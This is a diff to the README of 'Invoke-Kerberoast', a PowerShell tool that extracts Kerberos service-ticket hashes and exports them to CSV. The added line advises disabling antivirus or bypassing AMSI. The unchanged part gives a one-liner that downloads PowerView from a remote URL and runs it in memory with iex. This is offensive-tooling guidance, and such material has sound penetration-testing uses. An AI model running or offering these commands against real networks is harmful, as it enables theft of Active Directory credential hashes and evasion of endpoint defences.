@@ -1,6 +1,8 @@
 # Invoke-Kerberoast
 PowerShell script to execute Kerberoasting and export samaccountname and hash to CSV.
 
+> IT IS RECOMMENDED TO DISABLE AV OR BYPASS AMSI
+
 #### Download PowerView into Memory
 ````
 iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/PowerSploit/dev/Recon/PowerView.ps1');Get-NetDomain;
